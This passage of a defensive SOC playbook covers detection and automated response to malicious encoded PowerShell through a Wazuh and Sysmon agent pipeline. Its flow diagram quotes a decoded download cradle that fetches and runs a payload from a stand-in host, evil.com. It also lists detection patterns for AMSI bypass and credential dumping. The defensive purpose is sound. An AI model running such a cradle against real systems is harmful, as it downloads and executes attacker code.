          - name: isolate_host
            api: edr_api OR firewall_api
            command: contain_host(${agent_id})
            verification: test_network_connectivity_blocked

          - name: block_c2_infrastructure
            api: firewall_api
            command: add_deny_rule(${malicious_ips})
            verification: query_firewall_rule_exists

          - name: collect_forensic_evidence
            api: wazuh_active_response
            script: forensic_collection.ps1
            output: upload_to_s3(${case_id})

        output: execution_results_json

      - task_id: post_action_verification
        description: "Verify containment actions were successful"
        checks:
          - process_terminated: query_wazuh_agent_process_list
          - host_isolated: test_network_ping
          - c2_blocked: query_firewall_logs
          - evidence_collected: verify_s3_upload
        output: verification_status_json

      - task_id: generate_incident_summary
        description: "Create final incident summary report"
        template: incident_summary_template
        include:
          - attack_timeline
          - malicious_indicators
          - containment_actions_taken
          - verification_status
          - recommended_next_steps
          - lessons_learned
        output: incident_summary_report

        distribute_to:
          - slack: #soc-alerts
          - email: soc-team@company.com
          - ticketing_system: auto_create_incident_ticket
          - case_management: attach_to_case(${case_id})
```

### Agent Communication Flow Diagram

```
┌─────────────────────────────────────────────────────────┐
│  Wazuh Alert: Suspicious PowerShell (Rule 91817)        │
│  Sysmon EID 1: PowerShell.exe -enc <Base64>             │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
         ┌───────────────────────┐
         │   TRIAGE AGENT        │ <───── SLA: 2 minutes
         │   ================    │
         │   1. Decode command   │
         │   2. Extract IOCs     │
         │   3. Pattern match    │
         │   4. Initial severity │
         └───────────┬───────────┘
                     │
                     │ Handoff Package:
                     │ - Decoded command: "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')"
                     │ - IOCs: [evil.com, 192.168.1.100]
                     │ - Patterns: [download_cradle, invoke_expression]
                     │ - Initial Severity: 75/100
                     │
                     ▼
         ┌─────────────────────────────┐
         │   INVESTIGATION AGENT       │ <───── SLA: 5 minutes
         │   =====================     │
         │   1. TI lookup (VT, OSINT)  │
         │   2. Correlate Sysmon       │
         │   3. Build timeline         │
         │   4. Assess context         │
         │   5. Final severity calc    │
         └───────────┬─────────────────┘
                     │
                     │ Handoff Package:
                     │ - TI Results: evil.com (VT: 15/89 malicious)
                     │ - Correlated Events:
                     │     * Sysmon EID 3: TCP connection to 192.168.1.100:4444
                     │     * Sysmon EID 11: File created C:\Windows\Temp\payload.exe
                     │ - Timeline: Execution → Download → Persistence
                     │ - Context: Parent=WINWORD.EXE (CRITICAL)
                     │ - Final Severity: CRITICAL (92/100)
                     │
                     ▼
         ┌─────────────────────────────────┐
         │   RESPONSE PLANNER              │ <───── SLA: 15 minutes
         │   ====================          │
         │   1. Generate containment plan  │
         │   2. Create approval request    │
         │   3. Auto-execute or await      │
         │   4. Execute actions            │
         │   5. Verify success             │
         │   6. Generate report            │
         └───────────┬─────────────────────┘
                     │
                     │ Containment Plan:
                     │ - Action 1: Kill PowerShell PID 4892 (AUTO-APPROVED)
                     │ - Action 2: Isolate host WS-FINANCE-01 (AUTO-APPROVED)
                     │ - Action 3: Block 192.168.1.100 at firewall (AUTO-APPROVED)
                     │ - Action 4: Disable user account jsmith (AUTO-APPROVED)
                     │
                     ▼
         ┌─────────────────────────────────┐
         │   EXECUTION RESULTS             │
         │   ====================          │
         │   ✅ Process terminated (PID 4892)
         │   ✅ Host isolated (ping test failed)
         │   ✅ Firewall rule created (deny 192.168.1.100)
         │   ✅ User account disabled (jsmith)
         │   ✅ Evidence collected (12 MB uploaded to S3)
         │                                 │
         │   Escalation:                   │
         │   - Slack: #soc-alerts          │
         │   - Email: SOC Lead + CISO      │
         │   - Ticket: INC-2026-00142 created
         └─────────────────────────────────┘
```

## Enhanced SLA/KPI Metrics

### Detection & Response SLAs

| Metric | Target | Measurement | Alerting Threshold |
|--------|--------|-------------|-------------------|
| **Detection Time** | < 1 minute | Time from process creation (Sysmon EID 1) to Wazuh alert | > 2 minutes |
| **Command Decode Time** | < 2 minutes | Time from alert receipt to full Base64/Unicode decode | > 3 minutes |
| **Initial Triage Time** | < 5 minutes | Time from alert to Triage Agent completion (IOC extraction, pattern matching) | > 7 minutes |
| **Threat Intelligence Lookup** | < 3 minutes | Time to complete all TI queries (VT, AbuseIPDB, etc.) | > 5 minutes |
| **Investigation Completion** | < 10 minutes | Time from alert to Investigation Agent final severity determination | > 15 minutes |
| **Containment Initiation** | < 15 minutes | Time from alert to first containment action (kill process, block IP) | > 20 minutes |
| **Host Isolation** | < 15 minutes | Time from alert to network isolation (for Critical severity) | > 20 minutes |
| **Evidence Collection** | < 30 minutes | Time to complete forensic evidence collection (memory dump, logs, artifacts) | > 45 minutes |
| **Management Notification** | < 30 minutes | Time from Critical alert to CISO/SOC Lead notification | > 45 minutes |

### Quality & Accuracy KPIs

| KPI | Target | Calculation | Review Frequency |
|-----|--------|-------------|------------------|
| **False Positive Rate** | < 15% | (False Positives / Total Alerts) × 100 | Weekly |
| **Command Decode Success Rate** | > 98% | (Successfully Decoded / Total Encoded Commands) × 100 | Weekly |
| **IOC Extraction Accuracy** | > 95% | (Correctly Extracted IOCs / Total IOCs) × 100 | Monthly |
| **Threat Intel Match Rate** | > 60% | (Alerts with TI Hits / Total Alerts) × 100 | Monthly |
| **Auto-Containment Success Rate** | > 90% | (Successful Auto-Actions / Total Auto-Actions) × 100 | Weekly |
| **Severity Escalation Accuracy** | > 85% | (Correct Severity Assignments / Total Alerts) × 100 | Monthly |
| **Mean Time to Detect (MTTD)** | < 1 minute | Average time from process creation to alert | Daily |
| **Mean Time to Respond (MTTR)** | < 15 minutes | Average time from alert to containment | Daily |
| **Mean Time to Resolve (MTTR)** | < 24 hours | Average time from alert to incident closure | Weekly |

### Agent Pipeline Performance Metrics

| Agent Stage | Processing Time Target | Throughput Target | Error Rate Target |
|-------------|----------------------|------------------|-------------------|
| **Triage Agent** | < 2 minutes per alert | 100 alerts/hour | < 2% |
| **Investigation Agent** | < 5 minutes per alert | 50 alerts/hour | < 3% |
| **Response Planner** | < 3 minutes per alert | 75 alerts/hour | < 1% |

### Business Impact KPIs

| KPI | Target | Impact | Reporting |
|-----|--------|--------|-----------|
| **Prevented Credential Theft** | Track count | High - Protects privileged accounts | Monthly CISO report |
| **Blocked C2 Communications** | Track count | Critical - Prevents data exfiltration | Monthly CISO report |
| **Stopped Lateral Movement** | Track count | Critical - Contains blast radius | Monthly CISO report |
| **Avoided Ransomware Deployment** | Track count | Critical - Business continuity | Quarterly Board report |
| **Cost Avoidance** | Track $$$ | High - ROI justification | Quarterly Board report |

## False Positive Handling

### Common False Positive Scenarios

| Pattern | Likely Benign Context | Validation Criteria | Whitelisting Recommendation |
|---------|----------------------|---------------------|----------------------------|
| **Encoded PowerShell** | Corporate deployment scripts (SCCM, Intune) | - Signed by corporate certificate<br>- Executed by SYSTEM from known path<br>- Matches known script hash | Whitelist by script hash + parent process |
| **Execution Policy Bypass** | Legitimate admin scripts with `-ExecutionPolicy Bypass` | - Executed from approved admin script repository<br>- User in IT Admin group<br>- During business hours | Whitelist by script path + user group |
| **Download Cradles** | Software installation scripts (downloading updates, patches) | - Downloading from known corporate URLs<br>- Part of approved change management<br>- Parent process is SCCM/Intune | Whitelist by URL pattern + parent process |
| **Hidden Window** | Scheduled maintenance tasks running in background | - Scheduled Task trigger<br>- SYSTEM account<br>- Known script signature | Whitelist by scheduled task name + script hash |
| **PowerShell from Office** | Office add-ins, macro-enabled templates (approved) | - Digitally signed Office document<br>- From corporate SharePoint<br>- User acknowledged macro execution | Whitelist by document hash + user confirmation |

### Whitelist Criteria Decision Matrix

```yaml
whitelist_evaluation:
  automatic_whitelist_approval:
    conditions_all_must_match:
      - script_path: matches "C:\\IT\\ApprovedScripts\\*"
      - script_signed_by: "Corporate IT Code Signing Certificate"
      - script_hash: exists_in_approved_hash_database
      - parent_process: ["SCCM Agent", "Microsoft Intune", "Task Scheduler"]
      - user_context: "SYSTEM" OR user_in_group("IT-Admins")

    action: auto_suppress_alert
    logging: log_to_whitelist_audit_trail
    review: quarterly

  conditional_whitelist_approval:
    conditions_any_must_match:
      - user_in_group: "IT-Admins" AND business_hours: true
      - parent_process: "explorer.exe" AND script_path_contains: "C:\\Program Files"
      - download_url_matches: "*.company.com/*" OR "*.microsoft.com/*"

    action: suppress_alert_with_notification
    logging: log_to_whitelist_audit_trail
    review: monthly

    additional_validation:
      - require_analyst_review: first_occurrence
      - require_manager_approval: if_user_not_in_IT_group

  never_whitelist:
    conditions_any_match:
      - amsi_bypass_detected: true
      - credential_dumping_pattern: true
      - lsass_process_access: true
      - c2_infrastructure_connection: true
      - known_malware_signature: true

    action: always_alert_no_suppression
    logging: log_attempted_whitelist_violation
    escalation: notify_soc_lead
```

### False Positive Tuning Process

1. **Detection → Triage** (Analyst reviews alert)
   - Validates command line and decoded content
   - Checks user context and business justification
   - Determines if legitimate business activity

2. **Triage → Validation** (L2 Analyst confirms)
   - Verifies with user/IT team
   - Reviews change management records
   - Confirms recurrence pattern

3. **Validation → Tuning** (SOC Engineering)
   - Creates whitelist rule with specific criteria
   - Documents business justification
   - Sets review/expiration date

4. **Tuning → Monitoring** (Automated)
   - Applies whitelist rule to future alerts
   - Logs suppressed alerts for audit
   - Tracks false positive rate reduction

## Post-Incident Activities

### If Malicious Confirmed

```yaml
post_incident_malicious:
  immediate_actions:
    - action: preserve_forensic_evidence
      tasks:
        - Full disk image (if Critical severity)
        - Memory dump of PowerShell process
        - Export all Sysmon/PowerShell logs
        - Capture network PCAPs (if available)
        - Screenshot registry persistence keys
      retention: 1_year_minimum

    - action: collect_additional_payloads
      tasks:
        - Search for downloaded files in %TEMP%, %APPDATA%
        - Extract files from process memory dump
        - Scan with AV/EDR for additional malware
        - Submit to malware analysis sandbox
      output: malware_sample_repository

    - action: extract_and_block_iocs
      tasks:
        - Extract all URLs, IPs, domains, hashes from investigation
        - Add to firewall block list (IPs, domains)
        - Add to EDR IOC list (hashes, file paths)
        - Share IOCs with ISAC/threat sharing platform
      distribution: organization_wide

    - action: threat_hunting
      tasks:
        - Hunt for same PowerShell command across all endpoints
        - Search for same file hashes in EDR
        - Query DNS logs for malicious domains
        - Scan network logs for C2 IP connections
        - Identify additional compromised hosts
      scope: enterprise_wide
      timerange: last_30_days

    - action: update_detection_rules
      tasks:
        - Create SIGMA rule for this specific attack pattern
        - Update Wazuh rules with new IOCs
        - Add Yara rule for malware family (if identified)
        - Tune existing rules to reduce false negatives
      validation: test_against_known_malicious_samples

  remediation_actions:
    - action: eradicate_malware
      tasks:
        - Remove persistence mechanisms (registry, scheduled tasks, startup)
        - Delete malicious files
        - Kill malicious processes
        - Unload malicious DLLs
      verification: rescan_with_multiple_av_engines

    - action: credential_reset
      tasks:
        - Reset password for affected user account
        - Reset passwords for all accounts on compromised host
        - Reset service account passwords (if accessed)
        - Revoke Kerberos tickets
        - Force re-authentication
      scope: based_on_lateral_movement_assessment

    - action: patch_vulnerabilities
      tasks:
        - Identify exploited vulnerability (if applicable)
        - Apply security patches
        - Harden PowerShell configuration (Constrained Language Mode)
        - Enable additional logging (Script Block, Transcription)
      validation: vulnerability_scan_post_patching

    - action: reimaging_consideration
      criteria:
        - severity: Critical
        - OR: [rootkit_detected, extensive_persistence, credential_theft]
      process:
        - Backup user data (scan for malware first)
        - Reimage system from gold image
        - Apply all patches before network reconnection
        - Restore data from clean backup
        - Monitor for 48 hours post-restoration

  reporting_and_lessons_learned:
    - action: incident_post_mortem
      attendees: [SOC Team, IR Team, Affected Business Unit, IT Security]
      agenda:
        - Attack timeline review
        - Root cause analysis
        - Detection effectiveness assessment
        - Response time analysis
        - Lessons learned and action items
      output: post_mortem_report
      distribution: CISO + Senior Leadership

    - action: update_playbook
      tasks:
        - Document new attack patterns discovered
        - Add new detection rules to playbook
        - Update decision tree if needed
        - Refine severity classification criteria
        - Incorporate lessons learned
      review: SOC Engineering + IR Team

    - action: security_awareness_training
      if: initial_access_via_phishing
      tasks:
        - Create case study for training
        - Conduct targeted training for affected department
        - Send organization-wide security reminder
        - Simulate similar attack in controlled environment
```

### If False Positive

```yaml
post_incident_false_positive:
  validation:
    - action: confirm_false_positive
      tasks:
        - Interview user/system owner
        - Review change management tickets
        - Verify business justification
        - Check for similar historical occurrences
      approval: SOC Analyst L2+

    - action: document_exception
      fields:
        - business_justification: free_text
        - script_purpose: deployment|maintenance|monitoring|etc
        - frequency: one_time|recurring_daily|recurring_weekly|etc
        - approver: name_and_role
        - documentation_link: change_ticket_url
      retention: permanent

  tuning:
    - action: create_whitelist_rule
      if: recurring_activity
      criteria:
        - exact_script_hash: ${script_sha256}
        - OR: script_path_pattern: "C:\\IT\\Approved\\*"
        - AND: parent_process: ["SCCM", "Intune", "Task Scheduler"]
        - AND: user_group: "IT-Admins" OR user: "SYSTEM"

      rule_properties:
        - rule_id: auto_generated
        - created_by: ${analyst_name}
        - created_date: ${timestamp}
        - expiration_date: ${current_date + 180_days}
        - review_frequency: quarterly
        - business_owner: ${approver_name}

      validation:
        - test_against_recent_alerts: last_30_days
        - estimated_reduction: calculate_suppression_rate
        - false_negative_risk: assess_whitelist_scope

    - action: tune_detection_rule
      if: high_false_positive_rate
      tasks:
        - Add exclusion for specific parent process
        - Add exclusion for specific script path
        - Increase severity threshold
        - Add additional context requirements

      testing:
        - replay_historical_alerts: last_90_days
        - measure_fp_reduction: target > 50%
        - measure_tp_retention: target > 95%

      approval: SOC Engineering Team

  continuous_improvement:
    - action: track_false_positive_metrics
      metrics:
        - fp_rate_by_rule: calculate_weekly
        - fp_rate_by_host: calculate_weekly
        - fp_rate_by_user: calculate_weekly
        - fp_rate_by_parent_process: calculate_weekly

      thresholds:
        - alert_if_fp_rate: > 20%
        - critical_if_fp_rate: > 40%

      review: SOC Lead weekly

    - action: periodic_whitelist_review
      frequency: quarterly
      tasks:
        - Review all whitelist rules
        - Validate business justification still valid
        - Confirm approver still employed
        - Check if script hash changed (potential tampering)
        - Remove expired or obsolete rules

      approval: SOC Manager
```

## Operational Notes

### Prerequisites for Effective Playbook Execution

1. **Sysmon Configuration**
   - All rules in this playbook require Sysmon installed on endpoints
   - Recommended Sysmon config: SwiftOnSecurity or Olaf Hartong configuration
   - Minimum Sysmon events required: 1, 3, 7, 10, 11, 13, 22

2. **PowerShell Logging**
   - Enable Script Block Logging (EID 4104) via GPO
   - Enable Module Logging (EID 4103) via GPO
   - Enable Transcription logging (optional but recommended)
   - Configure AMSI (enabled by default on Windows 10+)

3. **Wazuh Configuration**
   - Wazuh rules 91816-91820 and 92000-92999 must be active
   - Sysmon log ingestion configured (`ossec.conf`)
   - PowerShell Operational log ingestion configured
   - Active Response enabled for kill process and isolation actions

4. **Agent Pipeline**
   - Triage Agent deployed and configured for PowerShell command decoding
   - Investigation Agent with access to threat intelligence APIs
   - Response Planner with Wazuh API credentials for Active Response

5. **Threat Intelligence Feeds**
   - VirusTotal API key configured
   - AbuseIPDB API key configured
   - AlienVault OTX API key configured (optional)
   - Internal threat feed populated and maintained

### Known Limitations

- **Constrained Language Mode**: PowerShell in Constrained Language Mode may limit some attack techniques, reducing detection opportunities
- **AMSI Bypass**: Advanced AMSI bypass techniques may evade detection; rely on Sysmon behavioral analysis as backup
- **Encrypted Commands**: Custom encryption (non-Base64) may require manual analysis
- **Living-off-the-Land**: Some legitimate PowerShell cmdlets can be abused without triggering traditional malware signatures
- **Memory-Only Attacks**: Fileless malware may evade disk-based forensics; memory dumps are critical

### Maintenance Schedule

| Task | Frequency | Owner | Notes |
|------|-----------|-------|-------|
| Review and update MITRE ATT&CK mappings | Quarterly | SOC Engineering | Track new PowerShell TTPs |
| Test Active Response scripts | Monthly | SOC Engineering | Ensure kill process, isolation work |
| Review whitelist rules | Quarterly | SOC Lead | Remove obsolete, validate current |
| Update SIGMA rules | As needed | SOC Engineering | Incorporate new attack patterns |
| Test agent pipeline end-to-end | Monthly | SOC Engineering | Validate decode, TI lookup, response |
| Review SLA/KPI metrics | Weekly | SOC Manager | Identify performance gaps |
| Conduct tabletop exercise | Semi-annually | IR Team + SOC | Practice playbook execution |
| Update threat intelligence feeds | Weekly | SOC Analyst | Refresh IOC lists |

## References & Further Reading

### MITRE ATT&CK
- **T1059.001**: https://attack.mitre.org/techniques/T1059/001/
- **PowerShell ATT&CK Matrix**: https://attack.mitre.org/matrices/enterprise/

### Microsoft Documentation
- **PowerShell Script Block Logging**: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging
- **AMSI Documentation**: https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal
- **Sysmon**: https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon

### Threat Research
- **PowerShell Attack Frameworks**:
  - Cobalt Strike: https://www.cobaltstrike.com/
  - PowerShell Empire: https://github.com/EmpireProject/Empire
  - PowerSploit: https://github.com/PowerShellMafia/PowerSploit
- **AMSI Bypass Techniques**: https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
- **PowerShell Obfuscation**: https://www.danielbohannon.com/blog-1/2017/3/5/invoke-obfuscation-powershell-obfuscation-framework

### Wazuh Documentation
- **Wazuh PowerShell Rules**: https://documentation.wazuh.com/current/ruleset/rules/windows.html
- **Active Response**: https://documentation.wazuh.com/current/user-manual/capabilities/active-response/

### NIST & Compliance
- **NIST 800-61r2**: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf
- **SANS Incident Handling**: https://www.sans.org/white-papers/incident-handlers-handbook/

---

**END OF PLAYBOOK**

*Version 2.0.0 | TLP:AMBER | Authorized Distribution Only*
